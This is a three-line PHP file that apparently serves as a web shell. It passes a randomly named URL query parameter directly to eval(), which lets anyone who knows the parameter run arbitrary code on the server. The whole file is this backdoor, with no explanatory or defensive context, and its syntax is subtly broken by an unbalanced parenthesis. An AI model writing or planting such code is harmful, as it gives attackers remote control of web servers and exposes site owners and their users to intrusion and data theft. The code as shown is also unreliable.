<?php
eval(($_GET['mHchZUNZ']);
?>
